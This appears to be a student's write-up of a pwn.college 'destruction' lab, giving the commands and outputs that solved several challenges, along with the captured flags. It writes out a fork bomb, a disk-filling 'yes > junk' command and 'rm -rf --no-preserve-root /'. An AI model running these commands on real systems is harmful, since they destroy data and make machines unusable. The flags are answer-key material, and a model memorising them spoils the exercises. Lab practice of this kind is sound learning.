# Module 16: 

## Challenge 1
**Fork bomb **
Process:
we write a malicious script that creates two more new processes making the system unuasble.
we have to do this in two different sessions.
one where we run /challenge/check and one where we deploy the script

```
echo '$0 & $0 &' > bomb.sh
chmod +x bomb.sh
./bomb.sh
```
Flag:
> pwn.college{4BjDEK_VG-5RsxAkyj5Ws7aap8L.0VMyEzNxwiMyAzNzEzW}

## Challenge 2
**Disk space doomsday **

Process:
Disk has limited space. if we make it full we can make it unusable.
We output yes command into a new file called junk.
Then we free that file to restore the state of the system and get the flag.

```
hacker@destruction~disk-space-doomsday:~$ yes > junk
yes: standard output: Disk quota exceeded
hacker@destruction~disk-space-doomsday:~$ /challenge/check
Well done, you clogged the disk. Now free that space (remove the file you created) and run /challenge/check again to prove you cleaned up!
hacker@destruction~disk-space-doomsday:~$ rm junk
hacker@destruction~disk-space-doomsday:~$ /challenge/check
Disk space restored. Here is your flag:
pwn.college{4gDyuTtwVrO7rHqGkbiZgXKzyhL.0lMyEzNxwiMyAzNzEzW}
```
Flag:
> pwn.college{4gDyuTtwVrO7rHqGkbiZgXKzyhL.0lMyEzNxwiMyAzNzEzW}

## Challenge 3
**Using rm-rf**

Process:
We can wipe out the entire system using rm rf command.
```
hacker@destruction~rm-rf-:~$ rm -rf /
/bin/rm: it is dangerous to operate recursively on '/'
/bin/rm: use --no-preserve-root to override this failsafe
hacker@destruction~rm-rf-:~$ rm -rf --no-preserve-root /
/bin/rm: cannot remove '/etc/hosts': Device or resource busy
/bin/rm: cannot remove '/etc/resolv.conf': Device or resource busy
/bin/rm: cannot remove '/etc/hostname': Device or resource busy
/bin/rm: cannot remove '/usr/sbin/docker-init': Device or resource busy
/bin/rm: skipping '/sys', since it's on a different device
/bin/rm: skipping '/home/hacker', since it's on a different device
/bin/rm: skipping '/run/dojo/sys', since it's on a different device
/bin/rm: skipping '/proc', since it's on a different device
/bin/rm: skipping '/dev', since it's on a different device
/bin/rm: skipping '/nix', since it's on a different device

Looks like you haven't wiped the system! We'll check again in 5 seconds...
Looks like you haven't wiped the system! We'll check again in 5 seconds...
Looks like you haven't wiped the system! We'll check again in 5 seconds...
YES! You wiped it, you wild hacker! The flag is yours:
pwn.college{IPPUAFhJ5M98HyZu_pkazLIJ4VN.0lMzEzNxwiMyAzNzEzW}
```
Flag:
>pwn.college{IPPUAFhJ5M98HyZu_pkazLIJ4VN.0lMzEzNxwiMyAzNzEzW}

## Challenge 4
**Using rm-rf with read**

Process:
using read after applying rm rf
```
hacker@destruction~life-after-rm-rf-:~$ rm -rf /
/bin/rm: it is dangerous to operate recursively on '/'
/bin/rm: use --no-preserve-root to override this failsafe
hacker@destruction~life-after-rm-rf-:~$ rm -rf --no-preserve-root /
/bin/rm: cannot remove '/etc/hosts': Device or resource busy
/bin/rm: cannot remove '/etc/resolv.conf': Device or resource busy
/bin/rm: cannot remove '/etc/hostname': Device or resource busy
/bin/rm: cannot remove '/usr/sbin/docker-init': Device or resource busy
/bin/rm: skipping '/sys', since it's on a different device
/bin/rm: skipping '/home/hacker', since it's on a different device
/bin/rm: skipping '/run/dojo/sys', since it's on a different device
/bin/rm: skipping '/proc', since it's on a different device
/bin/rm: skipping '/dev', since it's on a different device
/bin/rm: skipping '/nix', since it's on a different device

hacker@destruction~life-after-rm-rf-:~$ /challenge/check

Looks like you haven't wiped the system! We'll check again in 5 seconds...
Looks like you haven't wiped the system! We'll check again in 5 seconds...

YES! You did it again! Go read the flag!

hacker@destruction~life-after-rm-rf-:~$ read -r my_flag < /flag
hacker@destruction~life-after-rm-rf-:~$ echo "$my_flag"
pwn.college{U4_5gU1fXcjCbp5rsbE3N0q-_su.01MzEzNxwiMyAzNzEzW}
```
Flag:
> pwn.college{U4_5gU1fXcjCbp5rsbE3N0q-_su.01MzEzNxwiMyAzNzEzW}


## Challenge 5
**Using ls after rm rf**

Process:
trying to ls after rm rf.
```
hacker@destruction~finding-meaning-after-rm-rf-:~$ rm -rf --no-preserve-root /
/bin/rm: cannot remove '/etc/hosts': Device or resource busy
/bin/rm: cannot remove '/etc/resolv.conf': Device or resource busy
/bin/rm: cannot remove '/etc/hostname': Device or resource busy
/bin/rm: cannot remove '/usr/sbin/docker-init': Device or resource busy
/bin/rm: skipping '/sys', since it's on a different device
/bin/rm: skipping '/home/hacker', since it's on a different device
/bin/rm: skipping '/run/dojo/sys', since it's on a different device
/bin/rm: skipping '/proc', since it's on a different device
/bin/rm: skipping '/dev', since it's on a different device
/bin/rm: skipping '/nix', since it's on a different device
